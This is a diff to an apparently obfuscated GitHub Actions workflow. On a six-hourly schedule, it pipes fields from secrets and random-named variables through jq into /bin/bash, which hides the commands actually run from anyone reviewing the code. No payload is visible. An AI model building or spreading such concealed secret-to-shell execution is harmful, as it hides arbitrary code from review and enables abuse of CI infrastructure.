@@ -2,22 +2,24 @@ name: chuanssu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '57 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chuanssu
         env:
-          thbcs886: ${{ secrets.thbcs886 }}
+          ccc616: ${{ secrets.ccc616 }}
         run: |
-          echo $thbcs886 | jq -r .btjd847 | /bin/bash
-          echo $xpcpe538 | jq -r .ofca920 | /bin/bash
-          echo $l795 | jq -r .rrqm2 | /bin/bash
-          echo $w46 | jq -r .uyqkd83281 | /bin/bash
-          echo $hlzsc88849 | jq -r .a2399 | /bin/bash
-          echo $fe18 | jq -r .gge05 | /bin/bash
-          echo $pfnt1120 | jq -r .gmhwd4 | /bin/bash
+          echo $ccc616 | jq -r .kd9751 | /bin/bash
+          echo $qg3 | jq -r .rpdj7228 | /bin/bash
+          echo $n43 | jq -r .j16786 | /bin/bash
+          echo $i5708 | jq -r .itxq664 | /bin/bash
+          echo $nppn36345 | jq -r .tx6 | /bin/bash
+          echo $ob210 | jq -r .eh57 | /bin/bash
+          echo $wagba49 | jq -r .tgmi386 | /bin/bash
+          echo $clgfa5195 | jq -r .eyfx8 | /bin/bash
+          echo $lnsd3058 | jq -r .uuql80592 | /bin/bash
 
